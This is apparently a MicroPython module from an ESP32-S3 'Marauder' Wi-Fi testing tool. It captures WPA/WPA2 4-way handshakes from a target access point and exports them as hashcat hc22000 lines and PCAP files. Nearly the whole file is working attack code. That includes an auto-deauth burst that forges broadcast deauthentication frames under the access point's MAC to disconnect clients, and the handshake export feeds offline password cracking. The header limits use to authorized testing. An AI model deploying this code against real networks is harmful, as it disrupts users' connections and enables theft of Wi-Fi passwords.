# handshake.py — WPA 4-way handshake capture for ESP32-S3
#
# Part of ESP32-S3 Marauder — Wi-Fi Security Testing Tool
#
# WARNING: This tool is intended for AUTHORIZED penetration testing and
# educational purposes ONLY.  Unauthorized use is illegal.

import struct
import time
import gc

try:
    import ubinascii as binascii
except ImportError:
    import binascii

try:
    import _wifi_raw
except ImportError:
    _wifi_raw = None

from utils import (
    mac_bytes_to_str, get_storage_path, save_file,
    log, log_error, timestamp,
)
from packet_builder import (
    get_frame_type, get_addresses, is_eapol,
    get_eapol_message_num, parse_eapol_fields,
    build_deauth_frame, REASON_CLASS3_FROM_NONASSOC,
)

# ---------------------------------------------------------------------------
# PCAP constants (little-endian)
# ---------------------------------------------------------------------------
PCAP_MAGIC = 0xA1B2C3D4
PCAP_VER_MAJOR = 2
PCAP_VER_MINOR = 4
PCAP_SNAPLEN = 65535
PCAP_LINKTYPE_IEEE80211 = 105  # Raw 802.11 (no radiotap)


class HandshakeCapture:
    """Capture WPA/WPA2 EAPOL 4-way handshake from a target BSSID."""

    def __init__(self):
        self.target_bssid = None
        self.target_ssid = ''
        self.channel = 0

        self._running = False
        self._messages = {}       # msg_num -> parsed fields dict
        self._raw_packets = {}    # msg_num -> raw 802.11 bytes (for PCAP)
        self._anonce = None
        self._snonce = None
        self._mic = None
        self._client_mac = None
        self._eapol_payload = None  # raw EAPOL frame bytes of M2
        self._capture_count = 0
        self._start_time = 0

    @property
    def is_complete(self):
        has_m1m2 = (1 in self._messages and 2 in self._messages)
        has_m2m3 = (2 in self._messages and 3 in self._messages)
        return has_m1m2 or has_m2m3

    @property
    def status_str(self):
        parts = []
        for n in (1, 2, 3, 4):
            if n in self._messages:
                parts.append('M%d' % n)
            else:
                parts.append('__')
        return ' '.join(parts)

    def start(self, target_bssid, channel, ssid='',
              auto_deauth=False, deauth_interval=5):
        if _wifi_raw is None:
            log_error('_wifi_raw module not available')
            return

        self.target_bssid = target_bssid
        self.target_ssid = ssid
        self.channel = channel
        self._messages = {}
        self._raw_packets = {}
        self._anonce = None
        self._snonce = None
        self._mic = None
        self._client_mac = None
        self._eapol_payload = None
        self._capture_count = 0
        self._running = True
        self._start_time = time.ticks_ms()

        log('Handshake capture started on ch %d  BSSID %s  SSID "%s"' %
            (channel, mac_bytes_to_str(target_bssid), ssid))
        if auto_deauth:
            log('Auto-deauth enabled every %d s' % deauth_interval)

        _wifi_raw.set_channel(channel)
        # Filter: ONLY DATA frames (0x04) — EAPOL travels strictly inside DATA frames
        _wifi_raw.promiscuous_start(self._promisc_callback, 0x04)

        try:
            last_deauth = time.ticks_ms()
            last_status = time.ticks_ms()

            while self._running:
                now = time.ticks_ms()

                # Auto-deauth burst
                if auto_deauth and time.ticks_diff(now, last_deauth) > deauth_interval * 1000:
                    self._send_deauth_burst()
                    last_deauth = now

                # Status print every 5 seconds
                if time.ticks_diff(now, last_status) > 5000:
                    elapsed = time.ticks_diff(now, self._start_time) // 1000
                    log('[%ds] Handshake: %s  (%d EAPOL pkts)' %
                        (elapsed, self.status_str, self._capture_count))
                    last_status = now

                # Check completion
                if self.is_complete:
                    log('*** HANDSHAKE COMPLETE: %s ***' % self.status_str)
                    break

                time.sleep_ms(100)

        except KeyboardInterrupt:
            log('Capture interrupted by user')
        finally:
            _wifi_raw.promiscuous_stop()
            self._running = False
            gc.collect()

        log('Capture stopped — %s — %d EAPOL packets' %
            (self.status_str, self._capture_count))

    def stop(self):
        self._running = False

    def _promisc_callback(self, buf, pkt_type, rssi):
        try:
            if not is_eapol(buf):
                return

            addrs = get_addresses(buf)
            if addrs is None:
                return
            addr1, addr2, addr3 = addrs

            if (addr1 != self.target_bssid and
                    addr2 != self.target_bssid and
                    addr3 != self.target_bssid):
                return

            self._capture_count += 1
            self._parse_and_store(buf, addr1, addr2, addr3)

        except Exception as e:
            log_error('Callback error: %s' % str(e))

    def _parse_and_store(self, packet, addr1, addr2, addr3):
        msg_num = get_eapol_message_num(packet)
        if msg_num == 0:
            return

        fields = parse_eapol_fields(packet)
        if fields is None:
            return

        if addr2 == self.target_bssid:
            client = addr1
        else:
            client = addr2

        if self._client_mac is None:
            self._client_mac = client
            log('Client identified: %s' % mac_bytes_to_str(client))

        if msg_num in self._messages:
            return

        self._messages[msg_num] = fields
        self._raw_packets[msg_num] = bytes(packet)

        if msg_num == 1:
            self._anonce = fields.get('anonce')
            log('Got M1 — ANonce captured')

        elif msg_num == 2:
            self._snonce = fields.get('snonce')
            self._mic = fields.get('mic')
            self._eapol_payload = fields.get('eapol_payload')
            log('Got M2 — SNonce + MIC captured')

        elif msg_num == 3:
            if self._anonce is None:
                self._anonce = fields.get('anonce')
            log('Got M3 — ANonce (backup) captured')

        elif msg_num == 4:
            log('Got M4 — handshake confirmation')

    def save_hc22000(self, filepath=None):
        if not self.is_complete:
            log_error('Handshake incomplete — cannot save')
            return None

        if self._mic is None or self._anonce is None:
            log_error('Missing MIC or ANonce')
            return None

        if self._eapol_payload is None:
            log_error('Missing EAPOL payload for M2')
            return None

        if 1 in self._messages and 2 in self._messages:
            mp = 0
        elif 2 in self._messages and 3 in self._messages:
            mp = 2
        else:
            mp = 0

        mic_hex = binascii.hexlify(self._mic).decode()
        ap_mac_hex = binascii.hexlify(self.target_bssid).decode()
        sta_mac_hex = binascii.hexlify(self._client_mac).decode()
        essid_hex = binascii.hexlify(self.target_ssid.encode()).decode()
        anonce_hex = binascii.hexlify(self._anonce).decode()
        eapol_hex = binascii.hexlify(self._eapol_payload).decode()

        line = 'WPA*02*%s*%s*%s*%s*%s*%s*%02d' % (
            mic_hex, ap_mac_hex, sta_mac_hex,
            essid_hex, anonce_hex, eapol_hex, mp)

        if filepath is None:
            storage = get_storage_path()
            safe_ssid = self.target_ssid.replace(' ', '_').replace('/', '_') or 'unknown'
            filepath = '%s/captures/handshakes/%s_%s.hc22000' % (
                storage, safe_ssid, timestamp().replace(':', ''))

        save_file(filepath, line + '\n', mode='w')
        log('Saved HC22000: %s' % filepath)
        return filepath

    def save_pcap(self, filepath=None):
        if not self._raw_packets:
            log_error('No packets captured')
            return None

        if filepath is None:
            storage = get_storage_path()
            safe_ssid = self.target_ssid.replace(' ', '_').replace('/', '_') or 'unknown'
            filepath = '%s/captures/handshakes/%s_%s.pcap' % (
                storage, safe_ssid, timestamp().replace(':', ''))

        global_hdr = struct.pack('<IHHiIII',
                                 PCAP_MAGIC,
                                 PCAP_VER_MAJOR,
                                 PCAP_VER_MINOR,
                                 0, 0,
                                 PCAP_SNAPLEN,
                                 PCAP_LINKTYPE_IEEE80211)

        data = global_hdr
        base_ts = time.ticks_ms() // 1000

        for msg_num in sorted(self._raw_packets.keys()):
            pkt = self._raw_packets[msg_num]
            pkt_len = len(pkt)
            ts_sec = base_ts + msg_num
            ts_usec = 0

            pkt_hdr = struct.pack('<IIII',
                                  ts_sec, ts_usec,
                                  pkt_len, pkt_len)
            data += pkt_hdr + pkt

        save_file(filepath, data, mode='wb')
        log('Saved PCAP: %s  (%d packets, %d bytes)' %
            (filepath, len(self._raw_packets), len(data)))
        return filepath

    def _send_deauth_burst(self, count=5):
        if _wifi_raw is None:
            return

        broadcast = b'\xff\xff\xff\xff\xff\xff'
        for i in range(count):
            pkt = build_deauth_frame(
                dst_mac=broadcast,
                src_mac=self.target_bssid,
                bssid=self.target_bssid,
                reason=REASON_CLASS3_FROM_NONASSOC,
                seq_num=(i & 0x0FFF))
            _wifi_raw.send_raw(pkt)
            time.sleep_ms(5)
